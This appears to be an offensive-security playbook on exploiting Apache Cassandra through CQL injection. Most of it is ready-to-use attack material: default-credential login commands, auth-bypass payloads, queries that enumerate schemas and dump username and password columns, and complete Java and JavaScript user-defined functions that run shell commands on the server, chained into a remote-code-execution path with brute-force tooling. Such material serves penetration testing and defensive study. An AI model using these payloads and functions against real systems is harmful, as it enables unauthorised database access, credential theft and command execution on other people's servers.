# Cassandra CQL Injection

## When this applies

- Application uses Apache Cassandra and concatenates user input into CQL (Cassandra Query Language) statements.
- Default Cassandra deployments often expose port 9042 with `cassandra:cassandra` default credentials.
- Cassandra ≤ 3.0 has user-defined functions (UDFs) enabled by default, allowing Java RCE.

## Technique

CQL syntax is similar to SQL but with a smaller attack surface — no UNION, no subqueries, limited string functions. Auth bypass mirrors SQLi tautology. RCE is achieved via UDFs (Java code execution from CQL).

## Steps

### 1. Default credentials check

```bash
cqlsh target.example 9042 -u cassandra -p cassandra
cqlsh target.example 9042 -u admin -p admin
cqlsh target.example 9042 -u root -p root
```

Default credentials are extremely common in lab and dev deployments.

### 2. Auth bypass (login forms backed by Cassandra)

```sql
' OR '1'='1
admin'--
admin' OR 1=1--
```

CQL accepts `--` and `//` comments.

### 3. Keyspace and table enumeration

```sql
SELECT keyspace_name FROM system_schema.keyspaces;
SELECT table_name FROM system_schema.tables WHERE keyspace_name='targetks';
SELECT column_name FROM system_schema.columns WHERE table_name='users';
```

`system_schema` is the metadata keyspace — public-readable on most installations.

### 4. Data extraction

```sql
SELECT * FROM users LIMIT 100;
SELECT username, password FROM users;
```

CQL `WHERE` clauses are restricted (must use partition key); injection often forces full-table scan via `ALLOW FILTERING`:

```sql
' OR username='admin' ALLOW FILTERING--
```

### 5. UDF RCE (Cassandra ≤ 3.0)

```sql
CREATE OR REPLACE FUNCTION system.exec(inp text)
  CALLED ON NULL INPUT RETURNS text LANGUAGE java AS $$
    String[] cmd = {"/bin/sh","-c",inp};
    java.util.Scanner s = new java.util.Scanner(
      Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
    return s.hasNext()?s.next():"";
  $$;

SELECT system.exec('id') FROM system.local;
```

`system.local` is a single-row table, so `SELECT` runs the UDF once and returns the command output.

### 6. UDF (Cassandra > 3.0 with `enable_user_defined_functions=true`)

Same syntax as above. The flag is `false` by default in Cassandra 3.x+ but commonly flipped on for analytics workloads.

### 7. Sandbox-escape JavaScript UDF

```sql
CREATE OR REPLACE FUNCTION system.exec(inp text)
  CALLED ON NULL INPUT RETURNS text LANGUAGE javascript AS '
    var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
    var pb = new ProcessBuilder("/bin/sh", "-c", inp);
    pb.redirectErrorStream(true);
    var p = pb.start();
    var stream = p.getInputStream();
    var reader = new java.io.BufferedReader(new java.io.InputStreamReader(stream));
    var sb = new java.lang.StringBuilder();
    var line;
    while ((line = reader.readLine()) !== null) sb.append(line + "\\n");
    sb.toString();
  ';
SELECT system.exec('whoami') FROM system.local;
```

JavaScript UDFs require `enable_scripted_user_defined_functions=true` (default false in modern Cassandra).

### 8. Combining CQL injection + default creds + UDF

The maximum-impact chain:
1. Identify Cassandra exposure on 9042.
2. Try default credentials (`cassandra:cassandra`).
3. If creds work or auth-bypass via CQL injection succeeds, create UDF.
4. Execute commands as the cassandra service user.

## Verifying success

- `SELECT system.exec('id') FROM system.local` returns shell output.
- `cqlsh` connects with default creds and lists keyspaces.
- Auth-bypass payload reaches a logged-in dashboard / returns user table data.

## Common pitfalls

- Cassandra `WHERE` clause restrictions — without `ALLOW FILTERING`, injection only works on partition-key columns. Many apps use a partition-key column for username, so basic auth bypass works.
- UDF creation requires `CREATE FUNCTION` permission; usually granted to the `cassandra` superuser. Default-credential login → full UDF rights.
- Modern Cassandra (4.x) deprecates `RUNS ON DRIVER` and tightens UDF sandboxing — Java UDFs run in a sandbox that blocks `Runtime.getRuntime().exec()` unless explicitly allowed in cassandra.yaml.
- `system_schema` is read-only; you can enumerate but not write metadata directly.
- CQL doesn't support stacked queries (no `;`-separated statements).

## Tools

- `cqlsh` (Cassandra CLI) for sandbox testing.
- `nmap -p 9042 --script cassandra-info,cassandra-brute` for discovery.
- Source code review for CQL string concatenation patterns.
- Metasploit `auxiliary/scanner/misc/cassandra_login` for credential brute-force.
